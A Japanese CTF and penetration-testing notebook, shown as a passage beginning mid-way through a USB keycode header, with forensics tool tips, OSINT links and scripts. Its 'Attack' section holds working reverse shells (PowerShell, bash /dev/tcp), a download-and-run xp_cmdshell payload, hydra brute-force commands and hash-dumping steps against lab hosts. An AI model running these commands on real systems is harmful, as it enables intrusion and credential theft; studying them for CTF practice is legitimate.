Keyboard LANG3#define KEY_HIRAGANA 0x93 // Keyboard LANG4#define KEY_ZENKAKUHANKAKU 0x94 // Keyboard LANG5// 0x95  Keyboard LANG6// 0x96  Keyboard LANG7// 0x97  Keyboard LANG8// 0x98  Keyboard LANG9// 0x99  Keyboard Alternate Erase// 0x9a  Keyboard SysReq/Attention// 0x9b  Keyboard Cancel// 0x9c  Keyboard Clear// 0x9d  Keyboard Prior// 0x9e  Keyboard Return// 0x9f  Keyboard Separator// 0xa0  Keyboard Out// 0xa1  Keyboard Oper// 0xa2  Keyboard Clear/Again// 0xa3  Keyboard CrSel/Props// 0xa4  Keyboard ExSel// 0xb0  Keypad 00// 0xb1  Keypad 000// 0xb2  Thousands Separator// 0xb3  Decimal Separator// 0xb4  Currency Unit// 0xb5  Currency Sub-unit#define KEY_KPLEFTPAREN 0xb6 // Keypad (#define KEY_KPRIGHTPAREN 0xb7 // Keypad )// 0xb8  Keypad {// 0xb9  Keypad }// 0xba  Keypad Tab// 0xbb  Keypad Backspace// 0xbc  Keypad A// 0xbd  Keypad B// 0xbe  Keypad C// 0xbf  Keypad D// 0xc0  Keypad E// 0xc1  Keypad F// 0xc2  Keypad XOR// 0xc3  Keypad ^// 0xc4  Keypad %// 0xc5  Keypad <// 0xc6  Keypad >// 0xc7  Keypad &// 0xc8  Keypad &&// 0xc9  Keypad |// 0xca  Keypad ||// 0xcb  Keypad :// 0xcc  Keypad #// 0xcd  Keypad Space// 0xce  Keypad @// 0xcf  Keypad !// 0xd0  Keypad Memory Store// 0xd1  Keypad Memory Recall// 0xd2  Keypad Memory Clear// 0xd3  Keypad Memory Add// 0xd4  Keypad Memory Subtract// 0xd5  Keypad Memory Multiply// 0xd6  Keypad Memory Divide// 0xd7  Keypad +/-// 0xd8  Keypad Clear// 0xd9  Keypad Clear Entry// 0xda  Keypad Binary// 0xdb  Keypad Octal// 0xdc  Keypad Decimal// 0xdd  Keypad Hexadecimal#define KEY_LEFTCTRL 0xe0 // Keyboard Left Control#define KEY_LEFTSHIFT 0xe1 // Keyboard Left Shift#define KEY_LEFTALT 0xe2 // Keyboard Left Alt#define KEY_LEFTMETA 0xe3 // Keyboard Left GUI#define KEY_RIGHTCTRL 0xe4 // Keyboard Right Control#define KEY_RIGHTSHIFT 0xe5 // Keyboard Right Shift#define KEY_RIGHTALT 0xe6 // Keyboard Right Alt#define KEY_RIGHTMETA 0xe7 // Keyboard Right GUI#define KEY_MEDIA_PLAYPAUSE 0xe8#define KEY_MEDIA_STOPCD 0xe9#define KEY_MEDIA_PREVIOUSSONG 0xea#define KEY_MEDIA_NEXTSONG 0xeb#define KEY_MEDIA_EJECTCD 0xec#define KEY_MEDIA_VOLUMEUP 0xed#define KEY_MEDIA_VOLUMEDOWN 0xee#define KEY_MEDIA_MUTE 0xef#define KEY_MEDIA_WWW 0xf0#define KEY_MEDIA_BACK 0xf1#define KEY_MEDIA_FORWARD 0xf2#define KEY_MEDIA_STOP 0xf3#define KEY_MEDIA_FIND 0xf4#define KEY_MEDIA_SCROLLUP 0xf5#define KEY_MEDIA_SCROLLDOWN 0xf6#define KEY_MEDIA_EDIT 0xf7#define KEY_MEDIA_SLEEP 0xf8#define KEY_MEDIA_COFFEE 0xf9#define KEY_MEDIA_REFRESH 0xfa#define KEY_MEDIA_CALC 0xfb#endif // USB_HID_KEYS
```

別パターン　Leftover Capture Dataの場合
```
PS C:\Program Files\Wireshark> .\tshark.exe -r C:\Users\ryuhta\Desktop\ctf\l.pcap -Y 'usb.capdata' -T fields -e usb.capdata > C:\Users\ryuhta\Desktop\ctf\p.txt
```

切り出した後は形式がUTF-16（BOM）なのでUTF-8にする

``` python
switcher = {"00":"<shift>","04":"a", "05":"b", "06":"c", "07":"d", "08":"e", "09":"f", "0a":"g", "0b":"h", "0c":"i", "0d":"j", "0e":"k", "0f":"l", "10":"m", "11":"n", "12":"o", "13":"p", "14":"q", "15":"r", "16":"s", "17":"t", "18":"u", "19":"v", "1a":"w", "1b":"x", "1c":"y", "1d":"z","1e":"1", "1f":"2", "20":"3", "21":"4", "22":"5", "23":"6","24":"7","25":"8","26":"9","27":"0","28":"<RET>","29":"<ESC>","2a":"<DEL>", "2b":"\t","2c":" ","2d":"-","2e":"=","2f":"[","30":"]","31":"\\","32":"<NON>","33":";","34":"'","35":"<GA>","36":",","37":".","38":"/","39":"<CAP>","3a":"<F1>","3b":"<F2>", "3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}
shiftKeys = {"00":"<shift>","04":"A", "05":"B", "06":"C", "07":"D", "08":"E", "09":"F", "0a":"G", "0b":"H", "0c":"I", "0d":"J", "0e":"K", "0f":"L", "10":"M", "11":"N", "12":"O", "13":"P", "14":"Q", "15":"R", "16":"S", "17":"T", "18":"U", "19":"V", "1a":"W", "1b":"X", "1c":"Y", "1d":"Z","1e":"!", "1f":"@", "20":"#", "21":"$", "22":"%", "23":"^","24":"&","25":"*","26":"(","27":")","28":"<RET>","29":"<ESC>","2a":"<DEL>", "2b":"\t","2c":" ","2d":"_","2e":"+","2f":"{","30":"}","31":"|","32":"<NON>","33":"\"","34":":","35":"<GA>","36":"<","37":">","38":"?","39":"<CAP>","3a":"<F1>","3b":"<F2>", "3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}
shift=0
flag = ""

def usb_hex_to_ascii(i):
	i = i.split('\n')[0]
#	print(i[1])
	if i[1] == "0":
	    i=switcher[i[4:6]]
	elif i[1]=="2":
	    i = shiftKeys[i[4:6]]
	return i

def readFile(i):
	fileOpen = open(i)
	return fileOpen

file = "p.txt"
file = readFile(file)

for line in file:
	line = usb_hex_to_ascii(line)
	if line == "<shift>":
		if shift==0 :
			shift = 1
		else :
			shift = 0
	else:
		flag = flag + line
print(flag)
```

#### DNSトンネリング
怪しいパケットだけにフィルタしてエキスパートパケット解析->CSVで出力

### Egress-Assess
ICMPとかでトンネリングさせてデータを送信するツール
ICMPの場合はdataフィールドにbase64でエンコードされてはいっていた。
各データの頭にインデックス的なデータが共通で入っているのでそこを取り除いてエンコードしたら復元できた

### Network Miner

Pcapファイルからメッセージやファイルを自動抽出するツール
https://www.atmarkit.co.jp/ait/articles/1002/22/news090.html

### text2pcap

16進でで書かれたテキストファイルをpcapにするツール。
-aはアスキーの部分を判別して読まないようにするオプション。
-tはパケットの前にある文字列を日付として読み込ませるための形式の指定。0秒以下は「.」でいい

```  bash
text2pcap -a　-t "%H:%M:%S." hex_x.txt test.pcap
```

txtの形式は以下

``` hex_x.txt
11:20:12.241489 IP 192.168.188.209 > 192.168.188.2: ICMP echo request, id 25293, seq 2, length 64	000000:  00 50 56 e3 aa 02 00 0c 29 43 b4 43 08 00 45 00  .PV.....)C.C..E.	000010:  00 54 7d 8c 40 00 40 01 c2 f7 c0 a8 bc d1 c0 a8  .T}.@.@.........	000020:  bc 02 08 00 74 bd 62 cd 00 02 5c 91 cd 5f 00 00  ....t.b...\.._..	000030:  00 00 34 af 03 00 00 00 00 00 10 11 12 13 14 15  ..4.............	000040:  16 17 18 19 1a 1b 1c 1d 1e 1f 20 21 22 23 24 25  ...........!"#$%	000050:  26 27 28 29 2a 2b 2c 2d 2e 2f 30 31 32 33 34 35  &'()*+,-./012345	000060:  36 37                                            67
```

### CAN
Controller Area Networkの略で車の制御につかうやうらしい。
解析にはsavvycanというツールを使う
https://www.savvycan.com/

### NDIS Capture
Microsoft製のネットワークキャプチャツール。
Wiresharkで開けない場合はこちらの可能性がある。
変換ツールが出てる
https://github.com/microsoft/etl2pcapng
```
> .\etl2pcapng.exe C:\Users\ryuhta\Desktop\tkys_not_enough.pcap pcapng
```

# バイナリ

### TrID

ファイル種別特定ツール(CLI)
参考URL
 https://www.wivern.com/security20140926.html 

### TrIDNet

ファイル種別特定ツール(GUI)
参考URL
 https://www.wivern.com/security20160822.html 

### strings

linux標準コマンド
 https://www.atmarkit.co.jp/ait/articles/1703/09/news038.html 

### バイナリファイルのパッチ処置
IDAとかで見てsleepさせている所がわかるなら、そこの値をバイナリエディタで書き変えて実行させられる。この場合、バイナリエディタで編集する方はリトルエンディアンになっているので注意。
例
IDA　0x9AF8DA00→エディタ　00DAF89A
書き換えるなら01000000にするとIDAでは00000001になる


# OSINT

### OSINT Framework

  OSINTをする際のフレームワーク、マインドマップのようなもの 
http://osintframework.com/ 

### BrainFuck
```
>,>,[>+>+<<-]>>[<<+>>-]<<[-<->]<-----[<+>[-]]>>[<<+>>-]<,[>+>+<<-]>>[<<+>>-]<<[-<->]<>+++++++++++++++++++++++++++++++++++++++++++++++++[<----->-]<[<+>[-]]>>[<<+>>-]<,[>+>+<<-]>>[<<+>>-]<<[-<->]<>++[<----->-]<-[<+>[-]]>>[<<+>>-]<,[>+>+<<-]>>[<<+>>-]<<[-<->]<------[<+>[-]]>>[<<+>>-]<,[>+>+<<-]>>[<<+>>-]<<[-<->]<----[<+>[-]]>>[<<+>>-]<,[>+>+<<-]>>[<<+>>-]<<[-<->]<>++++++++++++++++++++++++++++++++++++++++++++++++++[<----->-]<--[<+>[-]]>>[<<+>>-]<,[>+>+<<-]>>[<<+>>-]<<[-<->]<>+++++++++++++++++++++++++++++++++++++++++++++++[<----->-]<----[<+>[-]]>>[<<+>>-]<,[>+>+<<-]>>[<<+>>-]<<[-<->]<>++[<----->-]<----[<+>[-]]>>[<<+>>-]<,[>+>+<<-]>>[<<+>>-]<<[-<->]<>+++++++++++++++++++++++++++++++++++++++++++++++[<----->-]<[<+>[-]]>>[<<+>>-]<,[>+>+<<-]>>[<<+>>-]<<[-<->]<>++++[<----->-]<--[<+>[-]]>>[<<+>>-]<,[>+>+<<-]>>[<<+>>-]<<[-<->]<>++++++++++++++++++++++++++++++++++++++++++++++++[<----->-]<--[<+>[-]]>>[<<+>>-]<,[>+>+<<-]>>[<<+>>-]<<[-<->]<----[<+>[-]]>>[<<+>>-]<,[>+>+<<-]>>[<<+>>-]<<[-<->]<>++++++++++++++++++++++++++++++++++++++++++++++++++[<----->-]<-[<+>[-]]>>[<<+>>-]<,[>+>+<<-]>>[<<+>>-]<<[-<->]<>+++[<----->-]<[<+>[-]]>>[<<+>>-]<,[>+>+<<-]>>[<<+>>-]<<[-<->]<>++++++++++++++++++++++++++++++++++++++++++++++++[<----->-]<---[<+>[-]]>>[<<+>>-]<,[>+>+<<-]>>[<<+>>-]<<[-<->]<---------[<+>[-]]>>[<<+>>-]<,[>+>+<<-]>>[<<+>>-]<<[-<->]<------[<+>[-]]>>[<<+>>-]<,[>+>+<<-]>>[<<+>>-]<<[-<->]<>+++++++[<----->-]<-[<+>[-]]>>[<<+>>-]<,[>+>+<<-]>>[<<+>>-]<<[-<->]<>++++++++++++++++++++++++++++++++++++++[<----->-]<----[<+>[-]]>>[<<+>>-]<,>>+<<<[-]<[[-]>+++++++++++++++++[<+++++>-]<++.>+++++[<+++++>-]<++.---.-.-------.>>>>-<<<<[-]]>>>>[[-]>+++++++++++++[<+++++>-]<++.>++++++++[<+++++>-]<++++.+++..>++[<----->-]<---.--.>+++[<+++++>-]<++.[-]]

```

オンライン実行できるところ
http://www.usamimi.info/~ide/programe/brainfuck/brainfuck.html
こっちならメモリの増え方とかも見れる
https://kachikachi.net/brainfuck/

### Nyaruko
BrainFuckの派生 (」・ω・)」うー！(／・ω・)／にゃー！でプログラミングする
http://tsoft-web.com/sub/brainfuck/convert.html

### 過去のWebサイトを見たい時
インターネットアーカイブ
https://archive.org/
Web魚拓
https://megalodon.jp/

### WebProxy
他の国のプロキシを通してサイトをみたい場合に使えるサイトの一覧
http://free-proxy.cz/ja/web-proxylist/

### 短縮URLが短縮された日付を調べる方法
URLの後ろに+をつけるだけで出せる
例）https://bit.ly/mylnkbio+

### Githubからの情報取集
ユーザIDを取りたい場合
https://api.github.com/users/xxxxxxx/events/public
　　　　　　　　　　　　　　　　　　↑ここに片っ端から入れていく
またはリポジトリから一つ選んで/commit/をつけてアクセスするとコミットをまとめたページに入れる。
右側のcommitのところの文字列をコピーしてアドレスのmasterの代わりに張り付けて末尾に.patchをつけるとアドレス等の情報が取れる

### what3words
三つの単語で場所を表すアプリ
https://what3words.com/%E3%81%B5%E3%81%A4%E3%81%8B%E3%80%82%E3%81%9D%E3%81%86%E3%81%95%E3%80%82%E3%81%9C%E3%82%93%E3%81%9C%E3%82%93

### WiGLE
世界中のアクセスポイントのSSIDを地図上にプロットしているサイト
https://wigle.net/

# Attack

### autorecon

サービスのスキャンまで自動でしてくれるネットワークスキャナ
使い方は以下のような感じで
とても時間がかかるのでCTFでは不向き

``` bash
python3 autorecon.py 10.1.1.1
```

インストールは以下が参考になった
https://latesthackingnews.com/2019/08/04/autorecon-an-open-source-enumeration-tool

### onetwopunch

Nmapとunicornscanを使ったポートスキャンツール。速度が速い
要unicornscan。
インストールはGitからシェルを持ってくるだけ
https://github.com/superkojiman/onetwopunch

``` bash
sudo ./onetwopunch.sh -t list.txt -p udp
```

-tのテキストでIPを指定/24とかで範囲も指定できる。
-pでtcp/udp/allを指定

### rustscan
とても速いポートスキャンツール
rustscan -a 10.10.11.148 --range 0-65535 --ulimit 5000 -- -sV -sC -Pn


### Parsero

Robots.txtを検索するツール
aptでインストールできる

``` bash
parsero -u http://192.168.188.20
```

### smbver.sh

SMBのバージョンを取得する
Gitからshellを持ってくれば使える
https://github.com/rewardone/OSCPRepo/blob/master/scripts/recon_enum/smbver.sh

``` bash
sudo ./smbver.sh 192.168.188.20 445
```

### secretdump.py
 impacketの一つ


### john the ripper

パスワードクラックツール
ハッシュを張り付けたテキストを用意する

``` テキスト例
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::IEUser:1000:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::sshd:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::sshd_server:1002:aad3b435b51404eeaad3b435b51404ee:8d0a16cfc061c3359db455d00ec27035:::
```

```
#ブルートフォースする場合john hash.txt#リストを使う場合john --wordlist=/usr/share/john/password.lst hash.txt#結果を見るjohn hash.txt --show#windows7の場合は　–-format:nt　を付ける必要がある
```

### zip2john
zipファイルのパスワードハッシュを取得する

```
zip2john backup.zip >./zip.hash
john ./zip.hash
#ワードリスト使用の場合
john ./zip.hash --wordlist=/usr/share/wordlists/rockyou.txt

```

### evil-winrm
winrmというwindowsをリモートからコマンドラインで管理するためのものにlinuxから接続するためのもの

```
#ユーザ名とパスワードでやる場合
sudo evil-winrm -i 10.129.186.78 -u "Administrator" -p "badminton"

#証明書を利用する場合
sudo evil-winrm -i 10.10.11.152 -k /home/kali/timelapse/legacyy_dev_auth.key -c /home/kali/timelapse/legacyy_dev_auth.cert -S
```

### Hash Suite
windows用のハッシュクラックツール
以下のURLのDownload free version からダウンロードする
https://hashsuite.openwall.net/download

使い方は鍵のアイコンのタブからimportでファイルを入れる。
SAMファイルとsystemファイルがある場合はFrom Windows Registryから入れる。
Mainから実行とWordlistの使用などが設定できる

### sumdump
Linuxで使用できるレジストリからパスワードハッシュを出すツール。
SystemファイルとSAMファイルが必要
```bash
samdump2 SYSTEM SAM

```

### OSコマンドインジェクション
コマンドの後ろに;sleep 5とかでできるが
$(sleep 5)とかでも同じことができる

### ワイルドカードの悪用
https://jpn.nec.com/cybersecurity/blog/210903/index.html

### hydra
ブルートフォースツール

```
#ログインフォームにPOSTする場合
hydra -f -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-500.txt m2.mod6.axof.intra.hckr.jp http-post-form '/login.php:username=^USER^&password=^PASS^:Authentication Failed...'
hydra -f -l admin -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-500.txt 10.10.10.103 http-post-form '/login.php:user=^USER^&pass=^PASS^:失敗'
#Basic認証にGetする場合
hydra t3.mod6.axof.intra.hckr.jp http-get /basic -l ic-user -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-500.txt
#FTP
hydra  ftp://t1.mod6.axof.intra.hckr.jp -l ic-axis -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-500.txt
#SSH
hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p "Sh0ppyBest@pp\!" ssh://10.10.11.180

```

-fはひとつ見つかったらそこで処理をやめるというオプション

### ssh-username-enum.py（のユーザ列挙）
https://github.com/epi052/cve-2018-15473/blob/master/ssh-username-enum.py
OpenSSHの7.7以下のバージョンでは上記のツールを使ってユーザの列挙ができる。

```
python3 /home/icuser/tools/ssh-username-enum.py m2.mod4.axof.intra.hckr.jp -p 10022　-w /usr/share/seclists/Usernames/top-usernames-shortlist.txt
```

### mssqlclient.py
windows環境からは上手くいかなかったがlinuxからは上手くいった
kaliにあらかじめ入っていたものは上手く動かなかったので、新しく入れたほうが良い
``` bash
git clone --recurse-submodules https://github.com/SecureAuthCorp/impacket.git -c https.proxy="http://192.168.140.16:60080" 
sudo chmod  +x /home/kali/tools -R
python3 /home/kali/tools/impacket/examples/mssqlclient.py ARCHETYPE/sql_svc@10.129.161.170 -windows-auth
```

``` SQL
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.16.219/shell.ps1\");"
```

### PEASS-ng
情報列挙用のツール
git clone --recurse-submodules https://github.com/carlospolop/PEASS-ng.git -c https.proxy="http://192.168.140.16:60080"
ただし↑には実行体が含まれていないのでリリースページからダウンロードする必要がある

赤字で書かれたところが重要なところ
PS history file: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
にはpowershellのヒストリが残っていてパスワードが入っていたこともあった

### bashの呼び出し
```
/usr/bin/script -qc /bin/bash /dev/null 
/usr/bin/expect -c "spawn bash; interact"
python -c 'import pty; pty.spawn("/bin/bash")'
#↓viのコマンドとして
:!bash
#これをやった後はshellが不安定なので以下をやること

ctrl -Z #バックグラウンドへ
stty raw -echo;fg
export TERM=xterm
```

### powershellで動作するリバースシェル
``` powershell
client = New-Object System.Net.Sockets.TCPClient("10.10.16.219",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### msfvenomを利用したリバースシェルの作成
-pで対象を設定、-oで出力形式を決める
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.5 LPORT=4242 PrependFork=true -o rev.bin
```

### リバースシェルの受け口
ポートの開放を忘れずに
```
nc -vlp 4242
```

張った直後のリバースシェルは挙動が不安定なので以下のコマンドと動作で安定化させる

```
/usr/bin/script -qc /bin/bash /dev/null
#ここでctrl -Zを押してバックグラウンドに入れる
stty raw -echo;fg
export TERM=xterm
```

またはこれ
```
script /dev/null -c bash
```

### bashを利用したリバースシェル

bash -c 'bash -i >& /dev/tcp/10.10.16.219/4242 0>&1'

### revshellgen
python3で動作するリバースシェルのジェネレータ
python3 ./revshellgen.py

### リバースシェルを生成できるWebサービス
色々な方法でのリバースシェルが作成できる
https://www.revshells.com/

### SSH(ssh-keygen)
SSH接続を試みた場合にPermission denied (publickey).というエラーが出て接続できない場合は相手サーバに鍵を送れれば接続できる

```
ssh paul@10.10.11.148
ssh-keygen -t rsa #全部なしでOK
cd /home/kali/.ssh
cat id_rsa.pub #表示された文字を相手の/home/paul/.ssh/authorized_keysに送る

;echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCmiCCLFJqkP7YK0jyOZ995u8Oh/dPmKgAleIYS2KQbUf+zbyfYr8m6QnW0EVFQvwqyEd7SMCK9nZZA5aFeqA1ibMdopBg7rbZwBSyECOCUatD7XNMcFda/aunMblaXOBCgt2tIHLS7HVfFVdyNcaCO8baxb2WnUf5uM7u9HhHQqcEemrfHvNpgPjf1yrDmJhQDZqgWzGPSED8ZPXMf3kM7oc76pR4KBzZGg1Mu8l0fetiVqXyRpkt0Rcp0mm2Jw1HzdTNKXGnztnDL7T6SF9aBv+tP43hCjqytJgfq6IC3fWYZ1mzNBS1tTx6TxVAcSibttwK4m9I2agZC4IFkjH61bqDHUL0s7Ip5UI3YvOVydX0EiQxYEGHbcb0pEFUXzc/oNySTNtOEnNrKFmjXWTM4NLE+7jNrZnCse5Xxz0IJC8X26K1Xw3CZZ+A0FZrgB7e/+yxkc2/0EL5wMahOyQ2Q3JpXXIbZkv6R8NiWcVctAMI1uIfoiGVa8Z70YRPvpQs= kali@kali > /home/paul/.ssh/id_rsa.pub
;mv /home/paul/.ssh/id_rsa.pub /home/paul/.ssh/authorized_keys"
;chmod 600 /home/paul/.ssh/authorized_keys" #これで相手側にsshの鍵を作ることができた

#今度は自分のところの設定
chmod 600 id_rsa 
#鍵を使って接続する場合は-lでログイン先のユーザ名を指定して-iで自分の鍵を指定する。
ssh -l paul -i /home/kali/.ssh/id_rsa routerspace.htb
#鍵を使えばscpでファイルを送ることもできる
scp -i /home/kali/.ssh/id_rsa linpeas.sh paul@routerspace.htb:/home/paul

```

### searchsploit
脆弱性の検索を行うことができる
```
#最初に気になる単語で検索
searchsploit ebook
#結果のところに出たpathを-pで検索すると詳しく見れる
searchsploit -p php/webapps/39575.txt
```

### psexec.py
linuxからwindowsに接続するツール
python3 /home/kali/tools/impacket/examples/psexec.py administrator@10.129.161.170
ユーザ名の所を一般ユーザに変えてもいけるかもしれないが前回はゲスト扱いにされたり書き込めるディレクトリがないと表示されて失敗した。

### responder

中間者攻撃を行うためのツール
相手のwebサイトにRFIの脆弱性があればresponderを起動させた状態でこちらのファイルを見に来させることで攻撃が可能
-Iオプションには自分のネットワークインターフェースを指定する
```
sudo responder -I tun0 -A
```

### impacket
攻撃に使える様々なツールのセット
MSSQLのクライアントやpsexecなどがある
``` bash
#インストール
git clone --recurse-submodules https://github.com/SecureAuthCorp/impacket.git -c https.proxy="http://192.168.140.16:60080" 
sudo chmod  +x /home/kali/tools -R

```
#### secretsdump
WindowsのSYSTEMとSAMファイルからユーザのパスワードハッシュを抜き取るツール
参考
https://troushoo.blog.fc2.com/blog-entry-457.html

#### MSSQL
``` bash
#接続するところ
python3 /home/kali/tools/impacket/examples/mssqlclient.py ARCHETYPE/sql_svc@10.129.161.170 -windows-auth
	EXECUTE sp_configure 'show advanced options', 1;
	RECONFIGURE;
	EXECUTE sp_configure 'xp_cmdshell', 1;
	RECONFIGURE;
#MSSQLクライアントからPowershellを使ってファイルをダウンロード
xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.16.219/shell.ps1\");"
```


#### psexec
``` bash
python3 /home/kali/tools/impacket/examples/psexec.py administrator@10.129.161.170
```


# Office

###  xdoc2txt 

 PDF,WORD,EXCEL,一太郎などの各種バイナリ文書から、テキスト要素を抽出 する汎用テキストコンバータ 
http://ebstudio.info/home/xdoc2txt.html#download

### LibreOffice
フリーのoffice
マクロのパスワード無視できるかもしれない
参考URL
 https://web-roku.com/libreoffice-vba 

# Python

### base64デコードして文字列を検索する

``` python
import base64str = b"kokonibase64woireru="f=0while(f<1):    str = base64.b64decode(str).decode()    f=str.find("ctf{")print(str)
```

### 文字列のハッシュを計算して比較する
``` python
# coding: utf-8
# Your code here!
import hashlib

for i in range(100000):
    #桁埋め
    s = f'{i:04}'
    #文字列の作成
    str="MAKUNIKIEMPLOYEEID"+s
    #print(str)
    #ハッシュ化
    hs = hashlib.md5(str.encode()).hexdigest()
    #print(hs)
    #比較して見つけたら比較前の文字列を表示して終わり
    if(hs=="90b67cf9496d344f46f8e4460b677b50"):
        print(str)
        break

```

### サーバと連続でやりとりするPythonスクリプト

大丈夫、齋藤さんのスクリプトだよ

``` python
import refrom ptrlib
import *
s = Socket('153.120.138.163',7778)
while True:
    line = s.recv().decode()
    try:
        print(line)
        print(re.search(r'上官：\w+', line).group())
        result = re.search(r'上官：\w+', line).group()
        print(result)
        if 'グー' in result :
            print(2)
            s.sendline('2'.encode())
        if 'チョキ' in result :
            print(3)
            s.sendline('3'.encode())
        if 'パー' in result :
            print(1)
            s.sendline('1'.encode())
        result = re.search(r'\d+ \W \d+',line).group()
        ans = str(eval(result))
        print(result, ans)
        s.sendline(ans.encode())
        except:
            print(line)
            break
```

### 素数を計算

``` python
import sympy
sympy.prime( )
```

sympyでできない場合はこっちを
https://github.com/kimwalisch/primecount



# ruby

### サーバと連続でやりとりするスクリプト

参考
https://nkhrlab.hatenablog.com/entry/2017/10/19/205829
大丈夫？小林のスクリプトだよ

``` ruby
require 'socket'
#文章を受信する関数。引数で区切り文字
#def get_line(str)
line=""  
while true
    line =line + $sockin.getc
    if(line.end_with?(str)) then
        break    
    end
    end
    print line
    return
    line
end
$sockin = TCPSocket.open("153.120.138.163", 7779)
$sockout = $sockin
#カウント用c=0
##解く問題数toi=100
##文字列用
#line = ""while true  line = get_line("\n")  
##２行目に問題が来るので  line= get_line("=")  if line =~ /^[0-9]/ then    str=line    #evalに入れるために「＝」を削除    str=str.delete("=")    answer = eval(str)    print(answer.to_s + "\n")    $sockout.write(answer.to_s + "\n")    c=c+1    print(c)    #100問解いたら終了する    if(c==toi) then      break    end  endend#最後に答えを表示するところget_line("\n")get_line("\n")get_line("\n")$sockin.close
```



# その他

### チェックリストサイト

https://fareedfauzi.gitbook.io/ctf-checklist-for-beginner/

### ツール

https://github.com/eugenekolo/sec-tools

https://github.com/zardus/ctf-tools

### CyberChef

 参考URL
https://www.slideshare.net/Sh1n0g1/cyberchefhamactf2019-writeup 

CyberChefで繰り返し
 Labelレシピとjumpレシピを使います。
labalには適当な名前を、その下に繰り返したい処理を、その下のjumpのラベルにはlabel名を入れます。あとは回数を増やしていくだけ。 

https://github.com/mattnotmax/cyberchef-recipes

https://soji256.hatenablog.jp/entry/2021/02/08/070000

Cyberchefで文字列をデコンパイル
Reverse(Line)
From Hex
Reverse(Character)
でできる

Extract Filesでファイルを抜き出せる


### SysintermalsSuite

Windowsの便利ツール
参考URL
 https://www.atmarkit.co.jp/ait/articles/0612/26/news107.html 

### grep

文字列を絞り込み
linux標準コマンド
grep [検索したい文字列] -rl [検索対象フォルダのパス]
 https://www.atmarkit.co.jp/ait/articles/1604/07/news018.html 
 
パスワードを連想させる文字列を含むファイルを、カレントディレクトリ以下から検索する
grep -naREi "pas{1,2}w(or)?ds?" . 2> /dev/null

### Ubuntu18.04

参考URL
 https://waidotto.hatenadiary.org/entry/20120820/1345477008 

### サイバーウェポンラボ

 https://null-byte.wonderhowto.com/collection/cyber-weapons-lab/ 

###  SecLists

単語リスト
 https://github.com/danielmiessler/SecLists 

### diff
diff -w -u ファイル名



### shellによる文字列抽出

access_log.txtを読み込んで
manager/htmlの文字列のある行だけ抽出して
スぺース区切り10個めの部分を抽出して
base64でデコードして
Authorization:の文字列のある行だけ抽出して
スペース区切り3個めの部分を抽出する
``` bash
cat access_log.txt | grep /manager/html | awk '{ print $10 }' | base64 -d | grep Authorization: | cut -d ' ' -f 3
```

### shellで各行に処理

temp1の行数文繰り返し
1行ずつ呼び出して
base64でデコードしたものをファイルに書き出す
その後ろに""で改行をファイルに書き出す
``` bash
for i in `cat temp1` ; do echo $i | base64 -d >> temp2 ; echo "" >> temp2 ; done
```

### shellでカウント

temp2を読み込んで
:区切りで二つ目を取得
取得した文字列を並べなおす（uniqコマンドは連続していないと数えられないので）
各行の出現回数を数える
取得した文字列を数値として並べなおす(昇順)降順にしたければ-rをつける
``` bash
cat temp2 | cut -d ':' -f 2 | sort | uniq -c | sort -n
```

### sed
文字列操作コマンド。挿入や置換など、使える幅が広そう。
ファイルから読み込ませることになると思うが、読み込んだファイルに書き出そうとするとファイルが壊れるようなので注意
``` bash
#ファイル内の各行の先頭にMAKUNIKIをつける
sed "s/^/MAKUNIKI/g" 読み込みファイル > 書き出しファイル

#ファイル内の各行の末尾に.htmlをつける
sed "s/$/.html/g" 読み込みファイル > 書き出しファイル
```


### sort
sortコマンドに--version-sortをつけるとヴァージョンソートができる。
これを使うとIPも並べ替え可能

#### 過去に作ったワンライナー
ログからログイン失敗した行だけを抽出、IPアドレス]だけを抽出、]を削除、IPアドレス毎にソート、IPの重複をカウント、1回から3回のものを除外、IPだけにしたいので各行の先頭8文字を削除
```
cat SMTPLOG2017.log | grep "SASL LOGIN authentication failed" | grep -E "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}]" -o |grep -v 172.16  | sed -e 's/]//g' | sort --version-sort | uniq -c | grep -v " [1-3] " | sed -e 's/^........//g'     
```

### awk
与えられた文字列を操作する
↓では,区切りにした後、2列目と3列目を表示させている。ファイルからの入力か|（パイプ）での入力が必要
awk -F'[,]' '{print $2,$3}' login.csv > login.csv2

wiresharkから出力したデータは全部が全部同じ形の文字列になっているわけではなく、awkで処理したら区切り文字がずれてしまった…

### bc
ターミナルで計算する

### shellコマンド逆引き

